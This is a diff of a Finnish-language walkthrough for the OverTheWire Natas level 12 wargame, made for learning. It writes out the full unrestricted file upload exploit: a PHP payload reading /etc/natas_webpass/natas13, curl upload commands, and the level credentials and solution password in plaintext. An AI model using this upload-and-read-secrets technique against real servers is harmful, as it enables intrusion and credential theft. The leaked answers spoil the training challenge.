@@ -167,15 +167,20 @@ Choose a JPEG to upload (max 1KB):<br/>
 </html>
 ```
 
-Upotettaan välittömästi joku PHP-koodi pätkästä tyyppinen suoraan curl komentoon ja tämä joku shell-php koodi pätkä komento pohja: `<?php echo keitto ?>` <br><br>
+Tämä oli poikkeama steppi, kun en uskonut haettiin PHP - koodipätkän infoa, ja tässä komennossa tapahtuu nuoli kärki menemään PHP tiedostona
 
-Testausta ja upotettaan kuva tiedosto
 ```
 ┌──(kali㉿kali)-[~]
-└─$ echo "<?php echo keitto ?>" > image.php                            
+└─$ echo "<?php phpinfo(); ?>" >  kuvat.php
+```
+<br>
 
+**Seuraavaksi**:
+Otettaan skripti tiedosto mitä toistettiin eli `kuvat.php` ja tätä toistettaan siinä curl komennossa, ja komennossa määrittyy kyseisen -F maksimi tiedosto on se 1KB ja millä tiedoston nimellä toistettiin ja upotettuna HTTP protokollaansa.
+
+```
 ┌──(kali㉿kali)-[~]
-└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
+└─$  curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=kuvat.php" -F "uploadedfile=@./kuvat.php" http://natas12.natas.labs.overthewire.org
 <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -189,32 +194,48 @@ Testausta ja upotettaan kuva tiedosto
 <body>
 <h1>natas12</h1>
 <div id="content">
-The file <a href="upload/0y159blw3m.php">upload/0y159blw3m.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+The file <a href="upload/q7r2uzojcg.php">upload/q7r2uzojcg.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
 </div>
 </body>
 </html>
 ```
 
-Huomataan tätä prosessia kuin (Unrestricted File Upload vulnerability is exploitable) ja tämä URL osuus, eli tämä: `upload/0y159blw3m.php`
+Siksi tuleksena ja kun tarkistettaan se URL linkki ja perään toi *upload* tiedostonsa, eli `upload/q7r2uzojcg.php` --> http://natas12.natas.labs.overthewire.org/upload/q7r2uzojcg.php
 
-Seuraavissa tapahtuu tällainen URL komento ja pientä muutosta eli näin: <br>
-`http://natas12.natas.labs.overthewire.org/upload/0y159blw3m.php`
+![alt text](./kuvat-level11-15/Natas12-Kali-1.png)
 
-<br>
-**Seuraavaksi** 
-kutsutaan *phpinfo()* jotakin käskyä, että selvitettään tämän hakemiston polkua `/etc/natas_webpass/natas13` ja muuttujansa mitä aikaisempi toistettiin toi *image.php*. 
+Seuraavaksi halutaan selvittää Natas 13:sen salasansa, mutta periaatteessa samalla ideana ja muuttaa tämän `<?php phpinfo(); ?>` - PHP koodinsa muuttaen haettavaksi hakemiston polun `/etc/natas_webpass/natas13` - ja koska me halutaan määrittää sen samana ideana nuolikärjellä ulos > *tiedosto.php*
 
-Tämä on kuin periaatteessa sama kuin eka kali linux testi: <br>
+
+Tämä _oli_ aikaisempi virhe _error_ juttuja, mutta varmuuden vuoksi lisäsin tänne sen että miltä se näyttääkään. <br>
+**NÄMÄ OVAT VIRHEITÄ**
 ```
 ┌──(kali㉿kali)-[~]
 └─$ php -r '$p = file_get_contents("/etc/natas_webpass/natas13"); echo $p;'
 PHP Warning:  file_get_contents(/etc/natas_webpass/natas13): Failed to open stream: No such file or directory in Command line code on line 1
-``` 
 
-Nyt kun tarkistettaan se ainakin tiedoston *.php* on muuttunut
+┌──(kali㉿kali)-[~]
+└─$ php -r '$p = file_get_contents("/etc/natas_webpass/natas13"); echo $p;' > kuvat.php
+PHP Warning:  file_get_contents(/etc/natas_webpass/natas13): Failed to open stream: No such file or directory in Command line code on line 1
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/7596oxc5k7.php?kuvat=cat%20/etc/natas_webpass/natas13"
+$p = file_get_contents("/etc/natas_webpass/natas13"); echo $p;
+```
+
+![alt text](./kuvat-level11-15/Natas12-Kali-2.png)
+
+
+**Seuraavaksi, viralliset testit ja maaliin asti - START HERE**
+Kuitenkin aikaisempien säätöä ohjeiden ja vinkkien kanssa mutta nyt päästiin maaliin asti kutienkin.
+
 ```
 ┌──(kali㉿kali)-[~]
-└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
+└─$ echo "<?php \$p = file_get_contents('/etc/natas_webpass/natas13'); echo \$p; ?>" > upload.php
+
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=upload.php" -F "uploadedfile=@./upload.php" http://natas12.natas.labs.overthewire.org
 <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -228,36 +249,18 @@ Nyt kun tarkistettaan se ainakin tiedoston *.php* on muuttunut
 <body>
 <h1>natas12</h1>
 <div id="content">
-The file <a href="upload/p3r5we5y0g.php">upload/p3r5we5y0g.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+The file <a href="upload/zfz5mxj4y0.php">upload/zfz5mxj4y0.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
 </div>
 </body>
 </html>
-```
-
-Normi tarkistusesta, et sijoitettaan toi `upload/p3r5we5y0g.php"` <br><br>
-
-`curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/p3r5we5y0g.php"`
-
-
-Tässä tapahtuu jotakin _error_ vikaa mutta pitäisi ehkä mennä uusiksi..
-```
-┌──(kali㉿kali)-[~]
-└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB http://natas12.natas.labs.overthewire.org/upload/p3r5we5y0g.php
-<br />
-<b>Warning</b>:  Use of undefined constant keitto - assumed 'keitto' (this will throw an Error in a future version of PHP) in <b>/var/www/natas/natas12/upload/p3r5we5y0g.php</b> on line <b>1</b><br />
-keitto
-
 
 ┌──(kali㉿kali)-[~]
-└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/p3r5we5y0g.php?keitto=cat%20/etc/natas_webpass/natas123"
-<br />
-<b>Warning</b>:  Use of undefined constant keitto - assumed 'keitto' (this will throw an Error in a future version of PHP) in <b>/var/www/natas/natas12/upload/p3r5we5y0g.php</b> on line <b>1</b><br />
-keitto                                                                                                                
+└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/zfz5mxj4y0.php"
+trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+
 ```
 
-![alt text](./kuvat-level11-15/natas12-kali-1.png)
-
-Tämä on sama kuin ylempi komento, mutta pieni de javu kuin visuallisessa selaimen versiossa..
+![alt text](./kuvat-level11-15/Natas12-Kali-3.png)
 
 
 ## Level 12 - 4 - vinkkejä ja ohjeita:
@@ -270,3 +273,8 @@ https://learnhacking.io/overthewire-natas-level-12-walkthrough/ <br>
 
 https://medium.com/@enesaladag/overthewires-natas12-3c6e7ce72900 <br>
 
+**Mini yhteenveto**: 
+
+---
+
+# Level 13 - START HERE
